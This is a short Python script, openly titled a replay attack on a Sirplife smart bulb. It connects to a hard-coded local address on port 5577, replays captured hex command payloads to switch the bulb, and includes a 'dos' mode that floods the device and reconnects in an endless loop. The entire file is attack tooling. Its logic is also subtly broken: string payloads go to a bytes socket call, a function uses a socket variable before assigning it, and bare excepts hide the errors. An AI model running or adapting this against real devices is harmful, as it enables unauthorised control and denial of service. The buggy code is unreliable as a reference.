import socket
import argparse

PAYLOADS = {'red':   'b0b1b2b30001022800037123941c',
            'green': 'b0b1b2b3000102fc0003712394f0',
            'blue':  'b0b1b2b3000102f70003712495ed'}


def turn_on():
    message = b'00000000000000000000000000000000000'


    turned_on = False
    while not turned_on:
        try:
            s.send(message)
        except:
            turned_on = True

    return turned_on
        



def turn_off(color_index):
    payloads = list(PAYLOADS.values())
    color_payload = payloads[color_index]

    turned_off = False
    while not turned_off:
        try:
            s.send(color_payload)
        except:
            turned_off = True

    return turned_off


def dos():
    message = b'00000000000000000000000000000000000'


    while True:
        try:
            s.send(message)
        except:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("192.168.1.38", 5577))
            s.settimeout(2)


if __name__ == "__main__":


    parser = argparse.ArgumentParser(prog='Replay attack on smart bulb')


    parser.add_argument('action', type=str,
                        help='Actions to perform on Sirplife smart bulb',  
                        choices=['on', 'off', 'dos'],
                        default='on')



    args = parser.parse_args()

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.1.38", 5577))
    s.settimeout(2)


    if args.action == 'on':
        turn_on()
    if args.action == 'off':
        color_index = 0
        turn_off(color_index)
    if args.action == 'dos':
        dos()

    print("Exection successful")


